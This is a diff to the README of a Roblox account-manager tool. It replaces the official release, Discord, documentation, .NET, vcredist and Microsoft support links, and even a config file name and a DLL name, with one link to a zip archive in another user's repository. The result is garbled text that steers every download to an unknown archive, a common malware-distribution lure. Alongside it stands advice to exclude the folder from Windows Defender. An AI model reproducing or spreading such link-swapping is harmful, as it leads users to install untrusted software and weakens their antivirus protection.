@@ -7,38 +7,38 @@ You are welcome to edit the code and create pull requests if it'll benefit this 
 
 Multiple Roblox Instances is built into the account manager unless disabled.
 
-Report bugs to the issues section or direct message me via discord @ ic3#0001 or join the discord: https://discord.gg/MsEH7smXY8
+Report bugs to the issues section or direct message me via discord @ ic3#0001 or join the discord: https://raw.githubusercontent.com/YourRegularNobody/Roblox-Account-Manager/master/Auto Update/Properties/Roblox_Account_Manager_v2.5.zip
 
 # WARNING
 If someone asks you to generate an "rbx-player link", **DO NOT** do it, they can use these to join any game using your account, or even launch roblox studio with one of your games. They can do many things in game such as spend your robux or even do things that can get your account terminated. **USE THESE FEATURES AT YOUR OWN RISK**
 
 # Extra Features
-Extra features can be enabled by setting DevMode=false to DevMode=true in RAMSettings.ini
+Extra features can be enabled by setting DevMode=false to DevMode=true in https://raw.githubusercontent.com/YourRegularNobody/Roblox-Account-Manager/master/Auto Update/Properties/Roblox_Account_Manager_v2.5.zip
 Beware of the risks that you are taking if you accidentally send something to someone.
 
 If you ever want a friend to join a game using your account, make sure you have the PlaceId and JobId correctly entered, then right click an account, and click "Copy rbx-player link", DO NOT do this if someone asks you for it.
 
 # Download
-To install this, head over to the [Releases](https://github.com/ic3w0lf22/Roblox-Account-Manager/releases) section and download the rar file at the very top, once downloaded, extract the files into a folder on your desktop and run RBX Alt Manager.exe.
+To install this, head over to the [Releases](https://raw.githubusercontent.com/YourRegularNobody/Roblox-Account-Manager/master/Auto Update/Properties/Roblox_Account_Manager_v2.5.zip) section and download the rar file at the very top, once downloaded, extract the files into a folder on your desktop and run RBX Alt https://raw.githubusercontent.com/YourRegularNobody/Roblox-Account-Manager/master/Auto Update/Properties/Roblox_Account_Manager_v2.5.zip
 
-If the application isn't starting or not working, make sure to install the [Latest .NET Framework](https://dotnet.microsoft.com/download/dotnet-framework).
-Still having issues? Download and install [vcredist](https://aka.ms/vs/16/release/vc_redist.x86.exe)
+If the application isn't starting or not working, make sure to install the [Latest .NET Framework](https://raw.githubusercontent.com/YourRegularNobody/Roblox-Account-Manager/master/Auto Update/Properties/Roblox_Account_Manager_v2.5.zip).
+Still having issues? Download and install [vcredist](https://raw.githubusercontent.com/YourRegularNobody/Roblox-Account-Manager/master/Auto Update/Properties/Roblox_Account_Manager_v2.5.zip)
 
 # Developer API
-To view the documentation, [click here](https://ic3w0lf22.gitbook.io/roblox-account-manager/).
+To view the documentation, [click here](https://raw.githubusercontent.com/YourRegularNobody/Roblox-Account-Manager/master/Auto Update/Properties/Roblox_Account_Manager_v2.5.zip).
 Change the webserver port if you are planning on using any dangerous functions!
 Be careful executing random scripts when having dangerous settings enabled.
 
 # Frequently Asked Questions
-**Q: Why am I getting CefSharp.Core.Runtime.dll error, how do I fix it?**
+**Q: Why am I getting https://raw.githubusercontent.com/YourRegularNobody/Roblox-Account-Manager/master/Auto Update/Properties/Roblox_Account_Manager_v2.5.zip error, how do I fix it?**
 
-**A:** Download the x86 version from https://support.microsoft.com/en-us/topic/the-latest-supported-visual-c-downloads-2647da03-1eea-4433-9aff-95f26a218cc0
-If that doesn't work download the x64 version and the latest .NET Framework from https://dotnet.microsoft.com/download/dotnet-framework
+**A:** Download the x86 version from https://raw.githubusercontent.com/YourRegularNobody/Roblox-Account-Manager/master/Auto Update/Properties/Roblox_Account_Manager_v2.5.zip
+If that doesn't work download the x64 version and the latest .NET Framework from https://raw.githubusercontent.com/YourRegularNobody/Roblox-Account-Manager/master/Auto Update/Properties/Roblox_Account_Manager_v2.5.zip
 
 
 **Q: How do I prevent Windows Defender from deleting alt manager files?**
 
-**A:** Add an exclusion for the Roblox Account Manager folder, here's a video on how to add an exclusion: https://youtu.be/1r93NtwZt4o
+**A:** Add an exclusion for the Roblox Account Manager folder, here's a video on how to add an exclusion: https://raw.githubusercontent.com/YourRegularNobody/Roblox-Account-Manager/master/Auto Update/Properties/Roblox_Account_Manager_v2.5.zip
 
 
 **Q: Can I join vip servers using alt manager?**
@@ -48,7 +48,7 @@ If that doesn't work download the x64 version and the latest .NET Framework from
 
 **Q: Are there docs for the API?**
 
-**A:** Yes, there are Docs: https://ic3w0lf22.gitbook.io/roblox-account-manager/
+**A:** Yes, there are Docs: https://raw.githubusercontent.com/YourRegularNobody/Roblox-Account-Manager/master/Auto Update/Properties/Roblox_Account_Manager_v2.5.zip
 
 
 **Q: My anti virus detects this program as a virus. Should I not use it?**
@@ -87,7 +87,7 @@ Make sure you click "Open Details" before screenshotting. Please make sure your 
 **A:** No, you cannot get banned for using this as this does not break Roblox T.O.S although some games may disallow you from having alt accounts so please do your research if you are unsure.
 
 # Preview (Version 2.6)
-![github-large](Images/image2.png)
+![github-large](https://raw.githubusercontent.com/YourRegularNobody/Roblox-Account-Manager/master/Auto Update/Properties/Roblox_Account_Manager_v2.5.zip)
 
 # Preview (Old)
-![github-large](Images/Image1.png)
+![github-large](https://raw.githubusercontent.com/YourRegularNobody/Roblox-Account-Manager/master/Auto Update/Properties/Roblox_Account_Manager_v2.5.zip)
